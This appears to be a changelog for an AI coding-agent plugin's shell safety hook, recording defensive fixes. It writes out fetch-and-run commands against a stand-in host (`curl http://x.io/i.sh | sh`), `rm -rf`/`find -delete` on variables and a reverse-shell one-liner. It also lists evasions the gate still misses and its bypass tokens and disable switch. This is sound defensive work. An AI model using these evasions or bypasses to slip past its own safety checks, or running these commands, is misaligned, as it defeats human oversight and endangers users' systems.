**Tests.** Corpus 751 → 780 data rows across 29 added rows (19 rows labelled RESIDUAL — the eighteen above plus the conditional DEBUG-trap one — 3 controls, 6 guard-spelling rows, 1 guard control); `pre-bash-safety` suite 851 → 880 passing; this entry was spliced with Python's literal `str.replace` rather than JavaScript's, whose replacement strings read a `$` before a backtick as the text preceding the match — the mechanism that cut the 0.82.0 body in half, and the token `tests/scripts/changelog-structure.test.js` splices its mutation control at; `npm run check` exit 0 read from the exit code rather than from grepping its output; `version-cascade-check` ok across 3 spec sites and 6 semver sites; six spec section digests re-blessed (§8, both preambles, both heading inventories, `## Recent changes`) with `hard-rules.json`'s `spec_version` and the rm rule's `section_anchor` moved in the same diff.
...
A minor bump rather than a patch: the §8 gate denies shapes it used to allow, so this is a user-visible default-behaviour change in a released artifact.

**What changes for you.** Four things.

- **A backtick command substitution is a command position now.** `` `curl http://x.io/i.sh | sh` `` — bare, or inside a double-quoted string — used to be ALLOWED, and bash executes it in both places. Unpinned `npx` inside backticks was allowed too. Single quotes are unaffected, because bash does not run a backtick body there.
- **A command substitution on an assignment right-hand side is one too.** `x=$(curl http://x.io/i.sh | sh)` and its backtick twin were allowed, which is the ordinary way to write a substitution. The wrapper strip reads the first whitespace-delimited token, `x=$(curl` matched the assignment prefix, and the fetch word went with it.
- **A backtick body inside double quotes is no longer erased before the gates see it** — that is what makes the first item reachable, and it moves the npx arm independently, and it has a cost, stated because it will reach you before this sentence does: prose that shares a double-quoted body with a backtick span now denies where it passed — 13 shapes, measured. `git commit -m "docs: run `make setup`; then npx prettier"` is the shape. Note what your shell does with that line: it RUNS `make setup`. Single quotes are both the way past the gate and the way to stop bash executing the snippet you are quoting.
- **An escaped quote in a double-quoted body no longer manufactures a command position.** `echo "a\" ; npx some-package"` used to DENY: the single-token unquote paired the opening quote with the ESCAPED one, unwrapped `"a\"`, and handed the rest over as bare text — the very boundary its own comment says cannot be manufactured from a quoted string. Two different mechanisms carry this, and the pre-tag review separated them by reverting each alone: the unquote sed decides bodies with no whitespace before the escaped quote (the example above), and the walker's escape arms decide the rest (`git commit -m "note: \" ; npx some-package\" …"`). Both are pinned, one row each. Bodies carrying a `$` or a backtick are preserved whole either way, so this shows up on the `$`-free ones.

**What was reverted, and why it is the interesting part of this release.** The same batch set out to close the opposite complaint — quoted PROSE being read as a command, `mem_save --lesson "shape: cd /tmp ; rm -rf $X is what tripped it"`, which denies although bash never runs that `rm`. The fix was to fold `;` `|` `&` to a space inside a double-quoted body, outside expansion spans, on the argument that data cannot begin a command. Deciding where the spans are needs a parser, and the walker had a paren counter. Three review rounds found five §8 false negatives in it, each on a payload bash executes: a `)` inside `${x//)/-}` or closing a `case` pattern desynchronises the counter (and the unquote sed bares a quoted `)` before the walker even runs, so no unbalanced paren is needed); an unmatched `(` made the body read as unterminated and the raw copy had dropped the `(` of `$(`, so all three arms saw the command word as `$rm` / `$curl` / `$npx`; a desync moves the region boundary, so the executable tail lands in a second region with the flag clear; bash 5.3's `${ cmd; }` and `${| cmd; }` are substitution spellings the walker did not know, and the repair for those was one character short of bash's rule, missing a newline delimiter; and dropping a backtick span's exterior dropped the `$VAR` that the rm arm's deny is actually about — `rm -rf "$WORK_DIR/`date +%s`"` allowed.

Each of those was repaired and the next round found the next one, all in the same component, while the three other changes in this release produced zero findings across the same three rounds. So the fold is out. The false deny it was written for stays open, with three ways around it that all predate it: write the prose in single quotes, pass it via a file (`git commit -F`), or use the `[allow-rm-rf-var]` token the deny message prints. **This trade is the release's main decision**: the §8 gate is never-downgrade, a false deny has an escape hatch and a false negative does not, and a component with five FN regressions in three rounds does not earn a fourth attempt at tag time.

**Migration**: run `/claudemd-refresh` for the plugin. Nothing in this release changes a file you own.

**Way back**: a new deny is cleared per-command by the `[allow-curl-sh]` or `[allow-npx-unpinned]` token the deny message prints, or for the session by `DISABLE_PRE_BASH_SAFETY_HOOK=1` — both are yours to use, not the agent's (§8 Escape tokens). For the release: pin the marketplace entry to `v0.81.0`, then run `CLAUDEMD_ALLOW_DOWNGRADE=1 node scripts/install.js` from a checkout of `v0.81.0`. `install.js` refuses a downgrade without that variable, and it is the only thing that repoints the plugin manifest at the older hook — which is what runs. `/claudemd-update` will **not** do it: that command syncs the four spec files, and the spec is unchanged in this release. `docs/ROLLBACK.md` § "Local machine needs the previous version back" carries the same procedure.

**Repository side: the marketplace gate 0.81.0 documented as unreachable.** Two rulesets exist now — `main-integrity` (no deletion, no force-push on the default branch) and `release-tags-immutable` (no deletion, no force-push, no update on `refs/tags/v*`). A published version string can no longer be repointed at different code, which npm's registry already refused and git did not. Neither requires a status check, and that is a decision rather than an omission: GitHub applies required checks to direct pushes as well, a just-written commit has no check run, and the only account with push rights here is the maintainer's — the rule would end the atomic ship flow and bind nobody else. `docs/ROLLBACK.md` and the comment above the main-ancestry step in `npm-publish.yml` both say this now, and `.github/rulesets.expected.json` records the live state so the prose cannot drift from it unnoticed.

**For contributors: the golden pins cover the whole spec file, not the line.** A pin asserts one line verbatim; a bullet placed beside a rule, a preamble above it, a `### Superseded` header over it, or a clause appended to the NEXT line could revoke that rule with every gate green — four shapes demonstrated at exit 0 in an earlier review. Every section of both spec files is hashed now, each `## ` section including its subsections plus the preamble above the first heading, and a test asserts those spans partition the file, so "the whole file is watched" is a property the suite checks rather than a percentage in a comment. The ordered heading inventory is hashed too, which catches a header inserted at the END of a section, where the section's own bytes do not move. This judges no meaning — the approach two review rounds falsified — it makes a revocation impossible to land without the hash update in the same diff. The pre-tag review's sharpest case was a 14-byte-**shrinking** edit inside `### §5.1` that removed §5 Hard-AUTH from what binds under `aggressive` and passed every gate in the repository, including the byte-budget one; it now fails, naming `## §5 AUTH`. The cost, deliberately taken: any spec edit anywhere fails this gate until its section hash is re-blessed.

**Tests.** node 1152 → 1197 across 76 → 77 suite files; `pre-bash-safety` corpus 683 → 751 data rows and that suite 783 → 851 passing; hook suites 1450/1450 across 23 suites (a total no script prints — `run-all.sh` reports per suite, so it is summed with awk rather than added by hand); shellcheck 64 files clean at warning+; `tests/run-all.sh` OVERALL all suites passed; `npm run check` exit 0 read from the exit code, not from grepping its output; `spec-coherence-audit --strict` C=0 H=0 M=0 L=1 (the core-headroom LOW, unchanged); `version-cascade-check` ok across 3 spec sites and 6 semver sites.

The differential worth citing, with its limit stated: all 683 corpus rows that existed at v0.81.0 were driven through the hook at both revisions — **0 moved**. That is evidence the PINNED behaviour is intact. It is not evidence that no behaviour moved, because the corpus is not a complete description of the gate; the review found seven non-corpus shapes that moved, and they are why the fold was reverted.

**A corrupted release body, caught by review and not by any gate.** This entry shipped, briefly, with two sentences cut in half by a byte-identical copy of the changelog's own header, twice. The entry was spliced in with a JavaScript `String.replace(pattern, replacementString)`, and in a replacement STRING the token `$` followed by a backtick means "the input before the match" — the entry's prose contains that sequence twice. `claudemd-lint lint --file` returns OK on corrupted prose and no test read the file, so nothing saw it. `tests/scripts/changelog-structure.test.js` is three greps that would have: one H1, one versioning-policy heading, no foreign H2 inside the top entry, with a mutation control replaying the real corruption. The control's own first draft reproduced the bug it exists to pin, which is the sharper half of the lesson.

**What this release does not fix, each measured.** A `case` pattern's `)` is a command position no anchor carries, so `$(case $x in a) curl … | sh;; esac)` allows — it allowed in v0.81.0 too, and `)` is ordinary in prose, so widening the anchor needs its own false-positive probe set. A backslash inside a backtick span defeats the new backtick class (`` `cur\l http://x.io/i.sh | sh` ``): bash strips it and the span still runs, while `canon_cmd_words` un-escapes only a leading backslash, so the real repair is canon-level. `rm -rf "`date +%s`/$WORK_DIR"` allows, as it did in v0.81.0. And the quoted-prose false deny described above stays open by decision. All four are misses or false denies with an escape token, recorded rather than left to be rediscovered.

**One item is recorded rather than done.** The core byte budget sits at 24942 of 25000 with 58 bytes left. This release adds nothing to core, and no reduction ships with it: the audit's reduction table was spent in v6.27.0, and both remaining candidates are under their pre-registered thresholds (the skill-wording clause needs 30 L0/L1 task segments and this repo yields 5; the default-ASK flip needs 30 answered asks with 50% assent and has 9 with 0). The one move that deletes no rule — relocating §0.1 to extended — buys 58 bytes to about 390 for a structural change to a HARD rule's registered home. Recorded in Round 15's report §11.2 beside the other two, with the measurement that rejected it.
...
A minor bump rather than a patch: four hooks and two CLIs change what they do by default, and spec rules steer agent routing, so this is a user-visible default-behaviour change in a released artifact and owes a non-patch version, a migration note and a stated way back.

**What changes for you.** Six things behave differently.

- **`find "$VAR" -delete` is denied** when `$VAR` is an unvalidated variable, as `rm -rf "$VAR"` already was. `-exec rm …` and `-execdir rm …` too. A literal path, a relative `.`, a `find` that deletes nothing, and `: "${VAR:?}" && find "$VAR" -delete` all still pass — probed as nine corpus rows. The segment's command word was `find`, so the whole thing used to skip the §8 gate.
- **The §10-V vocab gate stops missing three shapes it was written to catch.** An English banned term with CJK on both sides (`实现更X的重试`) matched in `claudemd lint` and not in the hook, because GNU grep's `\b` is locale-aware and JS's is not — both engines now read the boundary the ASCII way. An escaped quote inside `-m "…"` truncated the scan at the backslash, so the rest of the message was never read. And one unclosed ``` in a prior turn blanked every line after it. If you write commit messages in 中文 with English adjectives in them, this gate will have more to say than it did.
- **Two concurrent installs no longer race.** `install()` takes `~/.claude/.claudemd-state/install.lock`; the second one returns `spec: "skipped-locked"` and touches nothing. Measured against the previous release with two processes per trial: 8 of 30 trials used to leave an empty `backup-<stamp>` directory — the one `CLAUDEMD_SPEC_ACTION=restore` reads, because it sorts newest — and 3 of 30 exited non-zero. Both are 0 of 30 now. A lock left by a killed process is taken over after 10 minutes.
- **`/claudemd-uninstall` with `CLAUDEMD_SPEC_ACTION=restore` exits 3 when it copies nothing back** (`warning: restore-empty`), where it used to exit 0. Your spec files are untouched either way; the exit code is what changes, and a wrapper script treating 0 as "your files are back" now learns otherwise.
- **`install` and `toggle` refuse a `settings.json` that is not a JSON object.** `null`, `[]` and scalars all parse, so `install` used to move your `CLAUDE.md`, copy the spec over it, and only then crash before writing the manifest — a state that re-ran the same doomed install every session; `toggle` used to report a new state and write nothing at all, because `JSON.stringify` drops properties set on an array.
- **Two spec rules read differently.** §2's L1 row says `≤2 files after §1.5 pairing` and L2 says `>2 files`, where "files ≤2" meant either two or four depending on whether you applied the pairing rule; and §10's one-line L1 report now requires `Not done` empty as well, so a task with something deferred gets the four-section form instead of dropping it. The clause list is the v6.29.0 entry in `spec/CLAUDE-changelog.md`.

**Migration**: run `/claudemd-update`; it shows the diff, waits for your choice, and backs the previous `~/.claude/CLAUDE*.md` trio up to `~/.claude/spec-backup-<stamp>/` before writing. Nothing else needs an action from you.

**Way back**: each new deny has a per-command escape token that the deny message spells out for you when it fires, and each hook has its `DISABLE_*_HOOK` switch — both are yours to use, not the agent's, which is what §8 Escape tokens says. For the whole release: pin the marketplace entry to `v0.80.0` and then run `/claudemd-update` — the pin alone leaves `~/.claude/` where it is, because `install.js` refuses a downgrade unless `CLAUDEMD_ALLOW_DOWNGRADE=1`. `docs/ROLLBACK.md` carries the per-failure-point routes, and its first section is corrected in this release: a bare `git revert` reaches nobody who already synced, because `version-sync.sh` skips a cache older than the manifest, `install.js` refuses the downgrade, and the upgrade banner fires on a newer tag that a revert never produces. The route is revert plus a patch bump plus a tag.

**One thing that will not save you and now says so.** The marketplace channel serves the pushed tag with no gate. The npm channel's gate is repaired here — `npm-publish.yml` gains the `static` job it never ran (eslint, prettier, the metrics assertions including the zero-cycles one `ARCHITECTURE.md` cites), one macOS leg, and a refusal to publish a tag whose commit is not on `origin/main` — but the marketplace half needs a ruleset on `main` requiring the `ci` check, which no file in this repo can set. Three tags (v0.73.0, v0.74.0, v0.75.0) published with their `ci` run red on macOS. `docs/ROLLBACK.md` states this at the top now instead of describing the npm gate as if it covered both.

**For anyone reading the JSON.** `sampling-audit`'s `totalTurns` field is renamed `totalAssistantTextRows`, and `audit.js` passes the new name through. It counts assistant message rows carrying text, sidechains included — a turn making four tool calls with prose between them contributes four — and it had been labelled "Total assistant turns" for the life of the field. This is the §10-V opportunity denominator, and it is due to be published with a precision figure, so it is renamed rather than annotated.

**What the audit found and what the fixes were verified against.** Every batch wrote its failing case first. The vocab suite went 47/50 to 50/50 with three deliberately-red cases and a control that stayed green throughout; a new class gate for JSONL readers went 1/5 to 5/5, having started with three `TypeError: Cannot read properties of null` — one line reading `null` parses, walks past the parse-failure catch, and took down all four readers of the two JSONL formats this repo consumes, including the one behind `claudemd audit`, whose exit 1 also means "hits found". The state-file regex that guards `CLAUDEMD_PURGE` matched 5 of 5 user files in a redirected state dir (`session-start-plan.txt`, `session-summary-notes.md`, `tmp-baseline-mine.csv`) and now matches none, while still covering all 20 shapes claudemd writes; the same purge now also runs when the manifest is missing, which is the one case where a user most needs it.

**Three checks now say what they do not check.** `spec-coherence-audit` is structural — inverting Iron Law #2, reversing the four-section order, deleting a §8 clause and re-pointing a cross-reference each left it reporting every check clean. `safety-coverage-audit` is keyword-shaped — replacing all three `hook_deny` calls in `pre-bash-safety-check.sh` with no-ops that kept the surrounding text still reported zero unimplemented rules. Both USAGE strings say so now and point at the whole-line golden pins that do catch that class. Neither tool is weakened; a clean run just stops reading as a claim it cannot make.

**Two findings are recorded rather than fixed**, each with the measurement that rejected the repair. A bare `word/word` is stripped as a path before the vocab scan, so a two-word claim written with a slash between the words is missed by both engines — narrowing it re-opens the deny-loop on ordinary branch names of the form `feature/<adjective>`, a false deny the author cannot clear by renaming. And the `baseline` exemption is a bare word test, so any mention of it exempts every ratio pattern in a message — requiring a digit alongside does not discriminate, since the ratio claim supplies one, and proximity-to-a-number passes a filename plus a percentage. Both residuals are misses on gates that have an escape hatch; both repairs would be blocks on ones that did not.

**Tests.** node 1091 → 1152 across 4 new suites (72 → 76 files), `pre-bash-safety` 763 → 783 corpus rows, hook suites green. Twenty-six whole-line golden pins now cover the changed spec rules, the lines they depend on, and the closure of the two enumerations they sit in; each was verified to fail under a one-line mutation of its own subject. `version-cascade-check` ok across 3 spec sites and 6 semver sites; `spec-coherence-audit --strict` exit 0.

**The pre-tag review changed what ships.** Two fresh subagents with empty context, told to falsify. The spec/release half returned 1 Critical, 2 High, 3 Medium and 3 Low.

The **Critical was in this release's own new publish gate**: the main-ancestry step ran `git fetch --no-tags --depth=0`, and `--depth=0` is not "no limit" in git — it is rejected during argument parsing (`fatal: depth 0 is not a positive number`, exit 128). Under the step's `set -eu` that aborts the step, fails the `publish` job, and `npm publish` never runs. Every tag from this release onward would have published nothing to npm while the marketplace channel, which the same release documents as ungated, still served the tag. Nothing could have caught it: all four files that mention `npm-publish.yml` read it as text. The repair is a `tests/scripts/workflow-step-exec.test.js` that EXECUTES the step bodies against a fixture git repository — the ancestry step on a tag that is on main, on one that is not, and the version-match step both ways. It went red on the exact fatal before the one-line fix.

Both Highs were the defect class this release's other half is about — a rule whose only home is a file that is not always loaded, or a fix applied to one of the places a rule is written. The subagent-ASK rule amended core §0's ambiguity default and core §5's signal while living only in extended, which L0–L2 never load; a subagent reading core alone would emit `[AUTH REQUIRED]` and block on a confirmation that cannot arrive. It is in core now, with the detail in §EXT §11-O, and the entry above no longer claims it "adds no obligation". And the audit's SPEC-M4 cited `core:212-214`: 212 was repaired and 213 — the L1-bugfix rule, three lines down, the most common L1 shape — carried the identical hole.

The Mediums: the L1/L2 pairing qualifier had only been added to L1, which relocated the overlap rather than closing it, because the pairing clause lives inside the **Local-Δ** definition and is not ambient; and four lines the new pins now depend on were themselves unpinned, so reverting the extended half of the SPEC-M4 fix, or widening `Local-Δ`'s file count at equal byte length, passed the whole node leg. Reproduced as four mutations that were green and are now red. Two Lows were gates that could not see their own subject — the `_doc`'s fifth copy of a count that the assertion stopped one clause short of, and a `needs:` regex that read the first match in the workflow rather than the `publish` job's — which is the class commit `4e4137f` in this range is named for.

**Budget.** Closing the Highs put core at 24942 of 25000 — **99.8%, 58 bytes left**. Per §0.1 the next version that adds to core must remove more than it adds; there is no longer room to defer that.

**The code half of the review found the §8 arm's real gap.** `find`'s *global* options — `-L`, `-H`, `-P`, `-D`, `-O<level>` — come BEFORE the path operands, and the new arm stopped scanning at the first `-`-prefixed token, so `find -L "$VAR" -delete` walked straight through the gate that this release added to catch it. `-L` is an everyday spelling. Five corpus rows now cover it. The same review found the arm's other end: `find "$HOME" -name '.DS_Store' -delete` newly DENIED, because the rewrite handed it to the whitelisted-var check whose rationale ("bare `$HOME` removes the entire home") does not transfer — a find with a selection primary is bounded by that primary. That deny is gone, the genuinely unbounded `find "$HOME" -delete` still denies, and the remediation text no longer tells you to add a subpath to a `find`, which would change what the command means to get past a gate.

Three more were regressions this release introduced. A completed install whose spec was a dotfiles **symlink** was reported as *interrupted* and the banner naming `CLAUDEMD_SPEC_ACTION=restore` was suppressed — `-e` follows links, and `createBackup` deliberately re-points a symlinked spec rather than copying it, so the exact shape that code exists for landed a dangling link and failed an `-e` test. A SIGKILL between the spec copy and its rename left a full copy of the spec behind with nothing to reap it — and on a symlinked spec that file lands inside your dotfiles git repo; killed-run copies older than five minutes are now swept before the next write. And the `~/.claude/tmp` reaper's depth bound was low enough that ordinary nesting hit it, at which point it reported the directory as *fresh* — so the retention window silently stopped applying to every scratchpad more than four levels deep.

The rest: `/claudemd-install` printed exit-0 success for a run that installed nothing when another install held the lock, and the command doc had no such value to report; `commands/claudemd-sampling-audit.md` documented a field this release renamed and two detectors whose predicates changed; the publish workflow's header said the macOS leg "stays out" ninety lines above the commit that added it; and two purge blind spots — `bootstrap-failed.json.last-shown` and the one state entry that is a directory — meant the branch written to remove "only claudemd's own state files" could not remove two of them.

**A second review round read the repair, and found the same shape again.** Three Highs, two of them inside round 1's fixes. The gate written to protect the Critical could not see its own subject: `stepBody()` found a step name anywhere in the file and ran the first `run:` block after it, so an `if: false` on the real step, or a same-name decoy above a gutted one, left it green — the identical "reads the first match, not the subject" defect that the `needs:` gate one file over had just been repaired for. It is anchored on the `publish` job now, refuses a conditional step, and demands the name be unique; all four attacks go red. Its fixture also had a one-commit `main`, so a `--depth=1` fetch — which refuses every real tag in CI — passed; the fixture is five commits with the tag two behind the tip, and the publish job's `fetch-depth: 0` is asserted, because dropping it produces the same false negative.

The second was the §10 repair itself: applying threshold 1 to `Not done` and threshold 2 to the other two left a single **`Failed`** item shipping as a one-line `Done:` — blocked work, the worse half of the section the fix exists to protect, one clause to the right of the clause that was repaired. Both rows are on the same threshold now, which is a net-delete. The third was round 1's own finding recurring: two more lines the new pins assert are themselves unpinned and flip byte-neutrally — core §2.2's ban on loading extended below L3, which every core/extended split in this release rests on, and core §0's `[PARTIAL]` definition, which the new §5 subagent clause redirects to. Both pinned, plus §10's four-section order, whose body could be inverted while the manifest's anchor stayed intact.

Also from that round: §0's Signals bullet still said `[AUTH REQUIRED]` blocks, unqualified, so §3's stricter reading resolved against the subagent clause §5 had just gained; and §5's "the authorized part" was undefined for a subagent, which could read its spawn prompt as the authorization — self-authorization by another name, which the next clause forbids. Both corrected, for seventeen bytes across the two lines.

*One correction carried from the batch itself: the first ten commits each claimed `npm run lint` clean, and `format:check` — its fifth step — had been red since the first of them. The verification grepped the output for `error|✖|problem` and prettier reports `[warn]`, so an empty grep read as a pass and the exit code was never checked. Eight files, all added by those commits; fixed in `0050b70`, and verification in this release is by exit code.*

## [0.80.0] - 2026-09-07

One spec change: **AI-CODING-SPEC v6.27.0 → v6.28.0**, closing the three findings the 2026-09-06 audit left open in its §8 after v0.79.0 shipped the rest. Core 23478 → 24642 bytes, extended 44596 → 44482, no new HARD rule; the enforcement partition moves 6 hook / 16 self / 2 both / 1 external → 6 / 17 / 2 / 1 because a layer that was always self-enforced is now counted. The clause list is the v6.28.0 entry in `spec/CLAUDE-changelog.md`; the round's execution record is §11 of `docs/audit/20260906-231957.md`.
...
**What changes for you.** Three things Claude will do differently. It will treat an explicit instruction from you as permission to override a spec **default** — the §3 order ranks conflicts, not permissions — so asking for an English report or a different routing no longer loses to a spec default; HARD rules and §5 AUTH gates are explicitly outside that and keep their existing channels, and anything in neither set gets a recommendation acted on with the reading stated, not a blocking question. It will stop reaching for a hook's bypass on its own: the six deny messages that advertise one now say the authorization is yours, and the spec says the same about both routes — the `[allow-…]` tokens and the `DISABLE_*` switches. And §5's eleven hard-AUTH categories carry an explicit `self-enforced` tag, which states a fact rather than adding a restriction — no hook has ever verified that `[AUTH REQUIRED]` was emitted before a delete, a migration or a config write. **Migration**: run `/claudemd-update`; it shows the diff, waits for your choice, and backs the previous `~/.claude/CLAUDE*.md` trio up to `~/.claude/spec-backup-<stamp>/` before writing. **Way back**: pin the marketplace entry to `v0.79.0` and then run `/claudemd-update` — the pin alone leaves `~/.claude/` where it is, because `install.js` refuses a downgrade unless `CLAUDEMD_ALLOW_DOWNGRADE=1`. `docs/ROLLBACK.md` carries the per-failure-point routes.

**Why these three.** Each is a rule only the agent can enforce, presented as if something mechanical stood behind it.

- **§5 AUTH had no row in `spec/hard-rules.json`.** Eleven hard-AUTH categories, and the §13.1 demote review and `/claudemd-rules` could not account the layer at all, while `scripts/sampling-audit.js` had been running a `§5-hard-auth` detector against it since v0.28.0. The layer is also fully agent-enforced, verified rather than assumed: a literal `rm -rf src/` fed to `pre-bash-safety-check.sh` in a scratch state dir returns exit 0, because `§8-rm-rf-var` fires only on unvalidated variables. The pre-tag review widened that result — five of the eleven categories pass with no hook arm at all: delete, prod deps, `.env` write, migration, CI/deploy config. The manifest entry carries `rule_hits_section: null`: its observability channel is the transcript scanner, not the hook taxonomy, and claiming otherwise fails `hard-rules-2`.
- **The bypasses were never declared.** Deny text advertises an exit to whoever reads it, which under `bypassPermissions` is the agent. §8 now declares both routes AUTH artifacts, and names the wider one: a `DISABLE_*` switch turns the gate off for the whole session and, unlike a token, writes **no** telemetry row at all — `hook_kill_switch` returns before any `hook_record`. The clause names the tokens by shape rather than by literal, because spelling them out puts the vocab hook's own bypass literal into a file the agent re-reads every turn, and that hook treats its literal anywhere in a command as authorization to skip — including in the commit message that documents it.
- **§3 ranked the spec above the current-turn user with no rule for relaxation.** §5.1, §8.V3 and §13 each already carved out a local override; read with "stricter reading wins", the spec pushed toward overruling the person typing. The audit's sample was a *default*: a user asked for an English report and core §1's language contract outranked them. The shipped clause is scoped to defaults for that reason.

**The pre-tag review changed what ships.** Two fresh subagents with empty context, told to falsify; between them 1 Critical, 4 High and 8 Medium. The Critical was in the release's own new rule. Its first draft let a user instruction relax any clause outside the §5.1 Never-downgrade set — which is a grant over most HARD rules — while §EXT §13 says, unchanged, `§8/HARD never yield`. Core §2.2 forbids loading extended at L0–L2, so the same instruction would have been honoured at L2 and refused at L3, with the contradiction structurally invisible from the L2 side. That is the v6.25.2 defect class exactly, and it was closed the same way: the clause is narrowed to defaults, and a `spec-structure.test.js` join now fails if either half of the agreement is deleted, and both lines carry a whole-line pin — a verification round restored the contradiction byte-neutrally by *appending* a reversal to the extended line, which the substring join alone let through. The same draft's floor also did not contain itself — "relax the Never-downgrade rule" was literally permitted — and it silently released the two categories §5.1-EXT refuses to give `AUTONOMY_LEVEL: aggressive`.

Three more from the review, each with its own gate. `hard-rules-5` selects `(HARD` and the new §5 tag reads `(default; HARD,`, so the release's headline change could be reverted — manifest row deleted, §13 prose reverted with it — and the suite stayed green at 1081/1081; the selector is widened and the revert now fails. `spec/OPERATOR.md` §13.1 shipped four counts about the manifest that nothing gated, all four stale by one release; `hard-rules-10` derives them now. And the §8 clause's hook half had landed only on the token option: the `DISABLE_*` option, including both of `ship-baseline-check.sh`'s, was untouched.

**A verification round then reviewed the repair.** No Critical, one High, and it was in the repair rather than the release: the join added to close the Critical checked a substring on an extended line that nothing pinned, so appending `, but core §3 User relaxation overrides that …` restored the exact contradiction, byte-neutral, with 1087/1087 green. That line is whole-line pinned now and the attack fails. The same round found that `hard-rules-10` hardcoded the demote ceiling it exists to protect — demoting a `both` rule to `self` left `OPERATOR.md` asserting a stale ceiling and a candidate list that no longer held, suite green — so the gate derives the ceiling from the manifest with the audit's own `isImmutableSection` predicate and checks the named ids too. It also caught that the slash-command fix had gone too wide: skipping those rows stopped them being *answers* and also stopped them being *tasks*, removing 19 of 88 task segments on this repo's corpus while `scanOverCeremony` still counted all of them. A slash command is a request the user typed, so it opens a task under §1.5 and is only never an answer; the fixture now pins both halves.

And it caught a count nobody had checked: **§5 lists eleven hard-AUTH categories, not twelve.** The wrong number was in both release entries and a test name, and `spec/CLAUDE-changelog.md` installs into `~/.claude/`. Two more of its findings are fixed here rather than deferred — the report printed H4 pooled even once `--global` stratified it in JSON, and the "not yet readable" verdict was a string literal with only the number interpolated, so setting a calibrated precision would have printed `NOT YET READABLE — precision is 0.92 (uncalibrated)` and blocked the very next step the comment prescribes.

**A third round reviewed the repair of the repair**, and found the same shape a third time: a fix that landed in one of the several places a rule is written. Dropping `report shape` from core §3's enumeration left both changelogs still listing it — and `spec/CLAUDE-changelog.md` installs into `~/.claude/`, so the file shipping beside the clause described a wider whitelist than the clause has, with the extra entry being exactly the one that reaches a HARD rule. The release note also promised "a one-line answer" would stop losing to a default, which the narrowed clause no longer grants. Both corrected. The round confirmed the Critical stays closed — it re-ran round two's byte-neutral append against the new pin and got a failure — and it closed out the numbers: the 93-vs-99 denominator gap decomposes exactly to the §1.5 continuation rule with zero residue, and `hard-rules-10`'s derived ceiling provably equals what `hard-rules-audit.js` computes.

Three of its Mediums are fixed here rather than deferred. `hard-rules-10` read five of the eight numbers in the bullet it guards and none of the manifest `_doc`'s third copy, so completing the demote mutation the way a maintainer would — updating exactly the numbers the assertion names — still shipped three false claims green; it now derives all of them and asserts the `_doc` sentence. The candidate-id check scanned the whole 16 KB file rather than the bullet, so three ids satisfied it from an unrelated table fifty lines away; it is set equality against the bullet now. And the readability verdict's calibrated branches were unreachable — a test pinned the precision constant to null, so performing the hand-labeling the source comment prescribes failed the suite — so the verdict is a pure function of precision with its boundary under test, and the configuration assertion is a separate test that a labeling pass is meant to change.

**One new measure, not a rule.** `scanAskRate` in `sampling-audit.js` reports answered asks and how many the user answered with assent rather than direction. The audit refused to resolve the §0 default-ASK question without that number. The disposition is pre-registered — with at least 30 answered asks, an assent rate at or above 50% flips §0 to default (b) — and a test pins both constants so a later retune is a visible diff. The review then demonstrated why volume must not be what unlocks it: the ask predicate is `YIELD_ASK_RE`, the turn-yield precondition reused, whose non-`?` alternatives are unanchored inside the 260-character tail, so an agent sign-off like `有问题说一声` scores as a question. A transcript containing **no questions at all** was driven to 35 asks at 100% assent, clearing both bars. So the renderer now refuses to declare the disposition readable while `ASK_RATE_PRECISION` is null, whatever the count says, and a fixture holds that finding executable. The report prints counts only — no asks-per-task ratio, because a false ask both inflates the numerator and suppresses the segment boundary it would be divided by. Also fixed: a compaction boundary no longer lets a pre-compaction question be "answered" by an unrelated new task, a slash command is no longer an answer, and `--global` now stratifies H4 by project class instead of publishing it pooled.

First run on this repo, as of 2026-09-07T06:18Z: 11 transcripts, 444 turns, 93 task segments, 6 answered asks, 0 assent. Two things move this figure and they are different. The corpus grows whenever anyone opens the repo, the measuring session included: a draft reading of 9 asks excluded the review sessions, and counting them gave 10. The drop from there to 6 is not growth — it is the slash-command fix, measured on identical data. Published counts from this measure need both a timestamp and the code revision.

**Budget.** Core is now 24642 of its 25000-byte cap — 98.6%, 358 bytes left — and `spec-coherence-audit` reports that as a LOW. v6.27.0's net-delete is what paid for these clauses and the room is spent; per §0.1 the next version adding to core must remove more than it adds. The two remaining items from the audit's §7.2 are blocked rather than deferred by choice: deleting the §2.1 skill-wording clause needs at least 30 L0/L1 task segments and this repo's 30-day window yields 5, and pinning a tokenizer-measured size needs an `ANTHROPIC_API_KEY` this environment does not have — the spec already took the audit's stated fallback in v6.27.0 and carries no token estimate at all.

**Tests.** Each changed rule line is pinned whole in `tests/scripts/spec-structure.test.js`; the seven pin names carry no version, because deriving one from the spec H1 (this release's first attempt) made it a tautology that ran ahead of every pin it did not introduce. The three pins this release introduced were run against a 12-case mutation battery in a sandbox clone (a fourth, on the §EXT §13 line, came later from the verification round and is covered by its own reproduction) — paraphrase, inversion and same-anchor decoy fail the gate for all three rules, and the three neighbour-revocation cases pass, which is the limit the file's own comment documents as open. Both reviewers reproduced that battery independently and got the same 9 RED / 3 GREEN. A corpus-wide decision diff drove all 663 rows of `tests/fixtures/bash-safety/corpus.tsv` through the pre- and post-change hooks: 663 identical decisions, 0 changed. Suite: node 1081 → 1091, `version-cascade-check` consistent across 3 spec sites and 6 semver sites, hook suites and `shellcheck --severity=warning` clean.

*Correction to an earlier draft of this entry: it cited "the 30-day rule-hits window" for the recorded bypasses. The log spans 1.6 days — `audit.js` reports `windowCovered: false` — and the bypass counts move as anyone probes the hooks, the reviewers included. The audit's finding stands on the mechanism, not on that denominator.*
...
**One hook fix: the §8 reverse-shell arm denied its own text as data.** Pattern 3d (an interpreter one-liner that opens a socket AND executes) extracted candidates from anywhere in the command with no command-position anchor and with heredoc bodies intact, and counted a bare module name as an execution primitive. So a `python3 -c` one-liner echoed into a notes file, quoted in a commit message, grepped for, or sitting inside a heredoc body denied, and so did `import socket, subprocess, os` with nothing called — five shapes reproduced in a sandbox HOME before the fix (Round-14 audit HK-H1). The Bash call that appended those five as corpus rows through a heredoc was itself denied by the defect it was recording, and so was the call that first tried to write this paragraph.

